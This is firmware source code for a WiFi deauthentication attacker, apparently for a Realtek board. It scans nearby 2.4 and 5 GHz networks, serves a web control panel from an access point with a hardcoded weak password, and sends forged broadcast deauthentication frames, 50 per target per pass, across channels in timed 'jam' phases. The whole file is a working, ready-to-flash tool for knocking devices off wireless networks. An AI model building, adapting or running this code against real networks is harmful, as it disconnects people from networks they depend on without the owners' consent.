#undef max
#include "vector"
#include "wifi_conf.h"
#include "map"
#include "src/packet-injection/packet-injection.h"
#include "wifi_util.h"
#include "wifi_structures.h"
#include "debug.h"
#include "WiFi.h"
#include "WiFiServer.h"
#include "WiFiClient.h"
#include "webui.h"

void handleRoot(WiFiClient &client);
void handle404(WiFiClient &client);

// LEDs:
//  Red: System usable, Web server active etc.
//  Green: Web Server communication happening
//  Blue: Deauth-Frame being sent

typedef struct {
  String ssid;
  String bssid_str;
  uint8_t bssid[6];
  short rssi;
  uint8_t channel;
} WiFiScanResult;

char *ssid = "WiFi-Deauther-Pro";
char *pass = "12345678";

int current_channel = 1;
std::vector<WiFiScanResult> scan_results;
std::map<int, std::vector<int>> deauth_channels;
std::vector<int> chs_idx;
uint32_t current_ch_idx = 0;
uint32_t sent_frames = 0;

WiFiServer server(80);
uint8_t deauth_bssid[6];
uint16_t deauth_reason = 2;

int frames_per_deauth = 5;
int send_delay = 5;
bool isDeauthing = false;
bool led = true;
uint32_t last_action_ms = 0;
bool isResting = false;

rtw_result_t scanResultHandler(rtw_scan_handler_result_t *scan_result) {
  rtw_scan_result_t *record;
  if (scan_result->scan_complete == 0) {
    record = &scan_result->ap_details;
    record->SSID.val[record->SSID.len] = 0;
    WiFiScanResult result;
    result.ssid = String((const char *)record->SSID.val);
    result.channel = record->channel;
    result.rssi = record->signal_strength;
    memcpy(&result.bssid, &record->BSSID, 6);
    char bssid_str[] = "XX:XX:XX:XX:XX:XX";
    snprintf(bssid_str, sizeof(bssid_str), "%02X:%02X:%02X:%02X:%02X:%02X", result.bssid[0], result.bssid[1], result.bssid[2], result.bssid[3], result.bssid[4], result.bssid[5]);
    result.bssid_str = bssid_str;
    scan_results.push_back(result);
  }
  return RTW_SUCCESS;
}

int scanNetworks() {
  DEBUG_SER_PRINT("Scanning WiFi networks (5s)...");
  scan_results.clear();
  if (wifi_scan_networks(scanResultHandler, NULL) == RTW_SUCCESS) {
    delay(5000);
    DEBUG_SER_PRINT(" done!\n");
    return 0;
  } else {
    DEBUG_SER_PRINT(" failed!\n");
    return 1;
  }
}

String parseRequest(String request) {
  int path_start = request.indexOf(' ');
  if (path_start < 0) return "/";
  path_start += 1;
  int path_end = request.indexOf(' ', path_start);
  if (path_end < 0) return "/";
  return request.substring(path_start, path_end);
}

std::vector<std::pair<String, String>> parsePost(String &request) {
    std::vector<std::pair<String, String>> post_params;

    // Find the start of the body
    int body_start = request.indexOf("\r\n\r\n");
    if (body_start == -1) {
        return post_params; // Return an empty vector if no body found
    }
    body_start += 4;

    // Extract the POST data
    String post_data = request.substring(body_start);

    int start = 0;
    int end = post_data.indexOf('&', start);

    // Loop through the key-value pairs
    while (end != -1) {
        String key_value_pair = post_data.substring(start, end);
        int delimiter_position = key_value_pair.indexOf('=');

        if (delimiter_position != -1) {
            String key = key_value_pair.substring(0, delimiter_position);
            String value = key_value_pair.substring(delimiter_position + 1);
            post_params.push_back({key, value}); // Add the key-value pair to the vector
        }

        start = end + 1;
        end = post_data.indexOf('&', start);
    }

    // Handle the last key-value pair
    String key_value_pair = post_data.substring(start);
    int delimiter_position = key_value_pair.indexOf('=');
    if (delimiter_position != -1) {
        String key = key_value_pair.substring(0, delimiter_position);
        String value = key_value_pair.substring(delimiter_position + 1);
        post_params.push_back({key, value});
    }

    return post_params;
}

String makeResponse(int code, String content_type) {
  String response = "HTTP/1.1 " + String(code) + " OK\n";
  response += "Content-Type: " + content_type + "\n";
  response += "Connection: close\n\n";
  return response;
}

String makeRedirect(String url) {
  String response = "HTTP/1.1 307 Temporary Redirect\n";
  response += "Location: " + url;
  return response;
}

void handleRoot(WiFiClient &client) {
  sendHeader(client);

  std::vector<WiFiScanResultUI> net24, net5;
  for (uint32_t i = 0; i < scan_results.size(); i++) {
    WiFiScanResultUI ui = {scan_results[i].ssid, scan_results[i].bssid_str, scan_results[i].rssi, scan_results[i].channel, (int)i};
    if (scan_results[i].channel <= 14) net24.push_back(ui);
    else net5.push_back(ui);
  }

  String status = "Idle";
  if (isDeauthing) {
    uint8_t ch;
    wext_get_channel(WLAN0_NAME, &ch);
    status = (ch == current_channel) ? "Sync" : "Jam";
  }

  sendMainUI(client, net24, net5, isDeauthing, sent_frames, frames_per_deauth);
  sendFooter(client);
}

void handle404(WiFiClient &client) {
  String response = makeResponse(404, "text/plain");
  response += "Not found!";
  client.write(response.c_str());
}

void setup() {
  pinMode(LED_R, OUTPUT);
  pinMode(LED_G, OUTPUT);
  pinMode(LED_B, OUTPUT);

  DEBUG_SER_INIT();
  WiFi.apbegin(ssid, pass, (char *)String(current_channel).c_str());

  scanNetworks();

#ifdef DEBUG
  for (uint i = 0; i < scan_results.size(); i++) {
    DEBUG_SER_PRINT(scan_results[i].ssid + " ");
    for (int j = 0; j < 6; j++) {
      if (j > 0) DEBUG_SER_PRINT(":");
      DEBUG_SER_PRINT(scan_results[i].bssid[j], HEX);
    }
    DEBUG_SER_PRINT(" " + String(scan_results[i].channel) + " ");
    DEBUG_SER_PRINT(String(scan_results[i].rssi) + "\n");
  }
#endif

  server.begin();

  if (led) {
    digitalWrite(LED_R, HIGH);
  }
}

void loop() {
  WiFiClient client = server.available();
  if (client.connected()) {
    if (led) {
      digitalWrite(LED_G, HIGH);
    }
    String request;
    while (client.connected()) {
      if (client.available()) {
        char c = client.read();
        request += c;
        if (request.endsWith("\r\n\r\n")) {
          // Found end of headers, wait a tiny bit for body if it's a POST
          if (request.startsWith("POST")) {
            unsigned long start = millis();
            while (millis() - start < 50) { // 50ms timeout for body
              if (client.available()) request += (char)client.read();
            }
          }
          break;
        }
      }
    }
    DEBUG_SER_PRINT(request);
    String path = parseRequest(request);
    DEBUG_SER_PRINT("\nRequested path: " + path + "\n");

    if (path == "/") {
      handleRoot(client);
    } else if (path == "/stats") {
      String mode = "Idle";
      if (isDeauthing) {
        uint8_t ch;
        wext_get_channel(WLAN0_NAME, &ch);
        mode = (ch == current_channel) ? "Resting" : "Attacking";
      }
      String json = "{\"status\":\"" + String(isDeauthing ? "Active" : "Idle") + "\",";
      json += "\"mode\":\"" + mode + "\",";
      json += "\"frames\":\"" + String(sent_frames) + "\",";
      json += "\"batch\":\"" + String(frames_per_deauth) + "\"}";
      client.print("HTTP/1.1 200 OK\nContent-Type: application/json\nConnection: close\n\n");
      client.print(json);
    } else if (path == "/rescan") {
      client.write(makeResponse(200, "text/plain").c_str());
      scanNetworks();
    } else if (path == "/deauth") {
      std::vector<std::pair<String, String>> post_data = parsePost(request);
      deauth_channels.clear();
      chs_idx.clear();
      for (auto &param : post_data) {
        if (param.first == "network") {
          int idx = String(param.second).toInt();
          int ch = scan_results[idx].channel;
          deauth_channels[ch].push_back(idx);
          chs_idx.push_back(ch);
        } else if (param.first == "reason") {
          deauth_reason = String(param.second).toInt();
        }
      }
      if (!deauth_channels.empty()) {
        isDeauthing = true;
      }
      client.write(makeResponse(200, "text/plain").c_str());
    } else if (path == "/setframes") {
      std::vector<std::pair<String, String>> post_data = parsePost(request);
      for (auto &param : post_data) {
        if (param.first == "frames") {
          int frames = String(param.second).toInt();
          frames_per_deauth = frames <= 0 ? 5 : frames;
        }
      }
      client.write(makeResponse(200, "text/plain").c_str());
    } else if (path == "/setdelay") {
      std::vector<std::pair<String, String>> post_data = parsePost(request);
      for (auto &param : post_data) {
        if (param.first == "delay") {
          int delay = String(param.second).toInt();
          send_delay = delay <= 0 ? 5 : delay;
        }
      }
      client.write(makeResponse(200, "text/plain").c_str());
    } else if (path == "/stop") {
      deauth_channels.clear();
      chs_idx.clear();
      isDeauthing = false;
      client.write(makeResponse(200, "text/plain").c_str());
    } else if (path == "/led_enable") {
      led = true;
      digitalWrite(LED_R, HIGH);
      client.write(makeResponse(200, "text/plain").c_str());
    } else if (path == "/led_disable") {
      led = false;
      digitalWrite(LED_R, LOW);
      digitalWrite(LED_G, LOW);
      digitalWrite(LED_B, LOW);
      client.write(makeResponse(200, "text/plain").c_str());
    } else if (path == "/refresh") {
      client.write(makeRedirect("/").c_str());
    } else {
      handle404(client);
    }

    client.stop();
    if (led) {
      digitalWrite(LED_G, LOW);
    }
  }
  
  if (isDeauthing && !deauth_channels.empty()) {
    uint32_t now = millis();

    if (isResting) {
      // SYNC PHASE: Guaranteed 5 seconds on AP channel for STOP command
      wext_set_channel(WLAN0_NAME, current_channel);
      if (now - last_action_ms >= 5000) {
        isResting = false;
        last_action_ms = now;
      }
    } else {
      // JAM PHASE: 10 seconds of aggressive deauthing
      int ch = chs_idx[current_ch_idx];
      wext_set_channel(WLAN0_NAME, ch);

      if (deauth_channels.count(ch)) {
        std::vector<int>& networks = deauth_channels[ch];
        if (led) digitalWrite(LED_B, HIGH);
        for (int idx : networks) {
          memcpy(deauth_bssid, scan_results[idx].bssid, 6);
          // High intensity: 50 frames per target per pass
          for(int f=0; f < 50; f++) {
            wifi_tx_deauth_frame(deauth_bssid, (void *)"\xFF\xFF\xFF\xFF\xFF\xFF", deauth_reason);
            sent_frames++;
          }
        }
        if (led) digitalWrite(LED_B, LOW);
      }

      current_ch_idx = (current_ch_idx + 1) % chs_idx.size();

      // After a full cycle of targets or after 10s, enter SYNC phase
      if (now - last_action_ms >= 10000) {
        isResting = true;
        last_action_ms = now;
        wext_set_channel(WLAN0_NAME, current_channel);
      }
    }
  } else {
    isResting = false;
    wext_set_channel(WLAN0_NAME, current_channel);
    delay(1);
  }
}
